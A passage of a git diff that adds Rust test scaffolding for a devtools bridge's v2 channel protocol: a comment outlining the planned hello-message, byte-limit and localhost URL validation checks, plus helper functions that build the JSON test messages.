index 0000000..cd759a0
--- /dev/null
+++ b/crates/devtools_bridge/src/panel_channel_tests.rs
@@ -0,0 +1,349 @@
+// Story 055, task 8.1 — the v2 wire additions for dev-server and panel sessions (design.md §B1,
+// §Data Models "Wire additions", GOTCHA G12). Requirements: R2.1, R5.1, R7.1, R7.3, R9.3
+// (Q2, Q4, Q5, Q14). Wired in the crate root `src/devtools_bridge.rs` as
+//
+//     #[cfg(test)]
+//     mod panel_channel_tests;
+//
+// Validation: `cargo test -p devtools_bridge panel_channel` (paths `panel_channel_tests::…`), plus
+// 045's `cargo test -p agent_ui browser_channel` still passing.
+//
+// Contract, as 045's channel_tests reach it (adjust the `use` and `verdict` only if one moved):
+//   - `crate::channel::parse_client(line: &[u8]) -> Result<ClientMsg, ChannelError>`;
+//   - `crate::channel::encode_server(&ServerMsg) -> Result<String, EncodeError>`, and `ServerMsg`
+//     deserializes from the wire;
+//   - `ChannelError` (de)serializes as its snake_case code and has `fatal()`;
+//   - `crate::listener::SESSION_PLACES`.
+// Messages are built from wire JSON, so the test pins field names and codes, not Rust variants.
+//
+// Hostile halves first:
+//   - G12, the missing-tag default must not swallow a WRONG tag: a 045 hello with no `kind`
+//     parses as an extension, while `kind: "dev-server"` (a typo) and an extension's fields under
+//     `kind: "panel"` are refused — a default that applied to any unknown tag would turn every
+//     typo into an extension;
+//   - identity: a dev_server hello and a panel hello never parse as one another (the panel shape
+//     carries no URLs, the dev-server shape needs both);
+//   - limits count bytes: a 4096-byte root of 2-byte characters passes and 4097 bytes fails;
+//   - URL rule (amended): `http:` on `localhost`, `127.0.0.1` or `[::1]` with an EXPLICIT port and
+//     ANY path (Vite's `base`, `http://localhost:5173/app/`) is accepted; a look-alike host,
+//     userinfo, `https:`, `0.0.0.0`, a missing port, a query or a fragment is refused — paths are
+//     allowed, so each refusal must come from its own rule; the 2048-byte cap is inclusive;
+//   - `fatal()`: the three new codes keep the session open (R9.3), in both directions — the
+//     session-ending codes stay fatal.
+
+use serde_json::{Value, json};
+
+use crate::channel::{ChannelError, ClientMsg, ServerMsg, encode_server, parse_client};
+
+fn code(error: &ChannelError) -> String {
+    match serde_json::to_value(error) {
+        Ok(Value::String(code)) => code,
+        other => panic!("ChannelError must serialize to its wire code, got {other:?}"),
+    }
+}
+
+fn error(code: &str) -> ChannelError {
+    serde_json::from_value(json!(code)).unwrap_or_else(|e| panic!("{code} is a ChannelError: {e}"))
+}
+
+fn parse(value: &Value) -> Result<ClientMsg, ChannelError> {
+    parse_client(&serde_json::to_vec(value).expect("json"))
+}
+
+fn verdict(value: &Value) -> String {
+    match parse(value) {
+        Ok(_) => "accepted".to_string(),
+        Err(error) => code(&error),
+    }
+}
+
+/// The `client` object of a parsed hello, re-serialized: how the test tells identities apart
+/// without naming Rust variants.
+fn client_of(value: &Value) -> Value {
+    let msg = parse(value).unwrap_or_else(|e| panic!("{value} parses: {e:?}"));
+    assert_eq!(msg.kind(), "hello");
+    let wire = serde_json::to_value(&msg).expect("ClientMsg serializes");
+    wire["client"].clone()
+}
+
+const ROOT: &str = "/home/dev/app";
+
+fn extension_hello(extra: Value) -> Value {
+    let mut client = json!({
+        "browser": "chrome",
+        "extension_id": "dhbddmompicnipfolmglmbnlpgglojid",
+        "extension_version": "0.1.0"
+    });
+    client
+        .as_object_mut()
+        .expect("object")
+        .extend(extra.as_object().cloned().unwrap_or_default());
+    json!({ "v": 2, "kind": "hello", "id": "h1", "client": client })
+}
+
+fn dev_hello(extra: Value) -> Value {
+    let mut client = json!({
+        "kind": "dev_server",
+        "root": ROOT,
+        "app_url": "http://localhost:5173",
+        "panel_url": "http://localhost:5174"
+    });
+    client
+        .as_object_mut()
+        .expect("object")
+        .extend(extra.as_object().cloned().unwrap_or_default());
+    json!({ "v": 2, "kind": "hello", "id": "h1", "client": client })
+}
+
+fn panel_hello(extra: Value) -> Value {
+    let mut client = json!({ "kind": "panel", "root": ROOT });
+    client
+        .as_object_mut()
+        .expect("object")
+        .extend(extra.as_object().cloned().unwrap_or_default());
+    json!({ "v": 2, "kind": "hello", "id": "h1", "client": client })
+}
+
+/// A root of exactly `bytes` UTF-8 bytes, mostly 2-byte characters.
+fn root_of_bytes(bytes: usize) -> String {
+    let rest = bytes - 1;
+    format!("/{}{}", "é".repeat(rest / 2), "x".repeat(rest % 2))
+}
